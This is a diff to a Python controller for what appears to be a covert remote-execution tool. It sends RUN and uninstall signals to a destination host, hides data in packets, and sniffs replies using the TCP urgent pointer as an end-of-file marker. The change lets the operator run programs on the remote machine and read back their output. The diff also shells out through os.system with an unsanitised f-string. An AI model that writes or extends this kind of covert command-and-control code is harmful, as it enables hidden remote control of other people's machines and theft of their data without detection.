@@ -13,6 +13,7 @@ sniffing = False
 dest_ip = None
 sniffing_event = threading.Event()
 ack_event = threading.Event()
+sniff_thread = None
 timeout = 10  # Timeout in seconds for acknowledgment
 
 def get_local_ip():
@@ -67,12 +68,12 @@ def start_watcher(file_path):
     input()
     stop_sniffing()
 
-def start_runner():
+def start_runner(program):
     global current_signal
     current_signal = "RUN"
-    send_signal("RUN")
+    os.system(f"python3 encoder.py RUN:{dest_ip} {program}")
     print("Run signal sent.")
-    # display program output
+    start_sniffing()
 
 def uninstall():
     """Uninstall the program by sending the uninstall signal."""
@@ -97,19 +98,25 @@ def packet_callback(packet):
             print(f"Decoded Data: {decoded_data}")
             if urgent_pointer_value == eof_signal:
                 print("EOF signal detected.")
-                save_file(decoded_data)
+                if current_signal == "RUN":
+                    print(decoded_data)
+                else:
+                    save_file(decoded_data)
+                current_signal = None  # Reset current_signal after handling
                 received_data = ""  # Reset received_data after handling
         except (UnicodeDecodeError, base64.binascii.Error) as e:
             print(f"Decoding error: {e}")
 
 def start_sniffing():
     """Start sniffing for packets."""
+    global sniffing, sniff_thread
     sniffing = True
     sniffing_event.clear()
     local_ip = get_local_ip()
     print("Waiting for signal...")
-    sniff_thread = threading.Thread(target=sniff_packets, args=(local_ip,))
-    sniff_thread.start()
+    if not sniff_thread or not sniff_thread.is_alive():
+        sniff_thread = threading.Thread(target=sniff_packets, args=(local_ip,))
+        sniff_thread.start()
 
 def sniff_packets(local_ip):
     """Sniff packets in a separate thread."""
